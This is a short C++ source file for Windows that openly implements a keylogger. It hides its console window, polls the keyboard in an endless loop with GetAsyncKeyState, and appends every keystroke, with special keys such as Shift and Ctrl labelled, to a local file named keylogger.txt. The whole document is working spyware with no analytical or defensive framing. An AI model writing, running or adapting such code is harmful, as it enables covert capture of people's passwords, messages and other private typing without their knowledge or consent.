#include<iostream>
#include<fstream>
#include<windows.h>
#include<string>
#include<bits/stdc++.h>
using namespace std;
//log file path
#define LOG_FILE "keylogger.txt"
//save data into log file
void savedata(string data){
    fstream logfile;
    logfile.open(LOG_FILE,ios::app);
    logfile<<data;
    logfile.close();
}
string translatespecialkey(int key){
    string result;
    switch (key)
    {
    case VK_SPACE:
    //space key
    result=" ";
    break;
    
    case VK_RETURN:
    //new line key
    result="\n";
    break;
    
    case VK_BACK:
    //backspace key
    result="\b";
    break;
    
    case VK_CAPITAL:
    //capslock key
    result="[CAPSLOCK]";
    break;
    
    case VK_SHIFT:
    //shift key
    result="[SHIFT]";
    break;
    
    case VK_TAB:
    //tab key
    result="[TAB]";
    break;
    
    case VK_CONTROL:
    //control key
    result="[CTRL]";
    break;
    
    case VK_MENU:
    //alt key
    result="[ALT]";
    break;
      case VK_LBUTTON:
    //left button of mouse key
    result="[LEFTCLICK]";
    break;
    case VK_RBUTTON:
    //right button of mouse key
    result="[RIGHTCLICK]";
    break;
    default:
        break;
    }
    return result;
}
int main(){
    int specialkeyarry[]={VK_SPACE,VK_RETURN,VK_BACK,
    VK_CAPITAL,VK_SHIFT,VK_TAB,VK_CONTROL,VK_MENU};
    string specialkeychar;
    bool isspecialkey;
    //hide terminal window
    HWND hand=GetConsoleWindow();
    ShowWindow(hand,SW_HIDE);
    //loop forever
    while(true){
        //loop through each key
        for(int key=8;key <=190;key++)
        {
            //check key is pressed
        if(GetAsyncKeyState(key)==-32767){
            //key is pressed
            //check if key is special key
            isspecialkey=find(begin(specialkeyarry),
            end(specialkeyarry),key) !=end(specialkeyarry);
            if(isspecialkey){
            //    this is a special key we need to translate in string
            specialkeychar=translatespecialkey(key);
            savedata(specialkeychar); 
            }else{
                // this is not special key.we need to check it lowercase or uppercase
                if(GetKeyState(VK_CAPITAL)){
                    // CAPSLOCK is on
                    savedata(string(1,(char)key));
                }
                 else{
                        //capslock is off 
                        // turn the character into lowercase before
                        savedata(string(1,(char)tolower(key)));
                    }
               }
            }
        }
    }
    return 0;
}